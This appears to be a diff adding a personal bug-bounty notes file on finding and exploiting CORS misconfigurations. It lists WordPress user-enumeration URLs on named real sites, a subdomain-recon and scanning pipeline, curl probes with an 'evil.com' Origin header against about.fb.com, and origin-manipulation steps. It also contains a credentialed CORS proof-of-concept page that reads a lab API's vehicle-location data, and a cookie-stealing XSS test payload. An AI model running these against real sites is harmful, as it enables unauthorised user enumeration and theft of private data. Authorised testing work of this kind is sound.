@@ -1,0 +1,57 @@
+https://www.vfairs.com/wp-json
+https://about.fb.com/wp-json
+https://blogrevamp.cashfree.com/wp-json/wp/v2/users
+https://rates.rewire.com/wp-json/wp/v1/users
+CORS vulnerability with trusted insecure protocols
+Target Goal - exploit the CORS misconfiguration to retrieve the administrator's API key
+
+assetfinder domainname | anew assets.txt
+subfinder -dL assets.txt -all -recursive > subdomain.txt
+cat assets.txt | httpx-toolkit -ports 80,443,8080, 8000, 8888 -threads 200> alive.txt
+python3 Corsy.py -i alive.txt -t 10 --heade
+nuclei -l alive.txt -tags cors
+https://github.com/chenjj/CORScanne
+burpsuite = caido
+
+https://github.com/s0md3v/Corsy
+https://cors-test.codehappy.dev/ (cors testing web application)	
+https://github.com/chenjj/CORScanner
+
+curl "https://about.fb.com/wp-json" -I
+curl "https://about.fb.com/wp-json" -I -H Origin:evil.com
+
+Analysis:
+Testing for CORS misconfigurations:
+1. Change the origin header to an arbitrary value
+2. Change the origin header to the null value
+3. Change the origin header to one that begins with the origin of the site. (random.link)
+4. Change the origin header to one that ends with the origin of the site.
+
+https://chaos.projectdiscovery.io/#/ (bug bounty program web application)
+
+
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "http://127.0.0.1:8888/identity/api/v2/vehicle/cd515c12-0fc1-48ae-8b61-9230b70a845b/location", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
+
+<script>alert(document.cookie);</script>
+w3af
